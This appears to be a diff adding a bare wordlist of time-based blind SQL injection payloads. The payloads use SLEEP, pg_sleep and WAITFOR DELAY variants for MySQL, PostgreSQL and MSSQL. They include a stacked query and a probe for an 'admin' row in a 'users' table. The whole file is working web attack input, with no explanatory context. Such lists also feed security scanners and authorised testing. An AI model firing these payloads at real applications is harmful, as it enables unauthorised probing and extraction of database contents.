@@ -1,0 +1,13 @@
+' AND SLEEP(5) --
+' AND SLEEP(5) AND '1'='1
+' OR SLEEP(5) --
+' OR SLEEP(5) AND '1'='1
+' AND pg_sleep(5) --
+' AND pg_sleep(5) AND '1'='1
+' WAITFOR DELAY '00:00:05' --
+' OR WAITFOR DELAY '00:00:05' --
+' AND (SELECT * FROM(SELECT COUNT(*),CONCAT((SELECT SLEEP(5)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --
+' AND (SELECT CASE WHEN (username='admin') THEN SLEEP(5) ELSE 0 END FROM users WHERE username='admin') --
+' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
+' ; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
